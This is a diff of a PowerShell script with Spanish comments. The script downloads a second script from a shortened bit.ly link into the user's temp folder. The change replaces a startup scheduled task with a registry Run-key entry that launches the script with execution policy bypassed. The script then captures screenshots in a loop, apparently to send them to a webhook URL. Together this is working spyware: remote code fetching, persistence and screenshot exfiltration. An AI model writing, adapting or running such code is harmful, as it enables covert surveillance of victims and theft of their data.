@@ -4,21 +4,24 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected1..."
+    Write-Host "Shortened Webhook URL Detected..."
     $hookurl = (irm $hookurl).url
 }
 
 # Ruta de la carpeta temporal del usuario
 $tempFolderPath = [System.IO.Path]::GetTempPath()
 $scriptPath = Join-Path -Path $tempFolderPath -ChildPath "sysw.ps1"
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$registryName = "MiScript"
+$registryValue = "`"powershell.exe -ExecutionPolicy Bypass -File '$scriptPath'`""
 
-# Descargar el script en la carpeta temporal del usuario
+# Descargar el script principal en la carpeta temporal del usuario
 Invoke-WebRequest -Uri "https://bit.ly/Screen_dc" -OutFile $scriptPath
 
-# Crear la tarea programada en el Registro de tareas de usuario
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "ScriptStartupTask" -Action $action -Trigger $trigger -User $env:USERNAME -RunLevel Limited
+# Agregar la entrada al Registro de Windows
+New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String -Force
+
+Write-Host "Se ha agregado una entrada al Registro para ejecutar el script al iniciar sesión del usuario."
 
 do {
     $Filett = "$env:temp\SC.png"
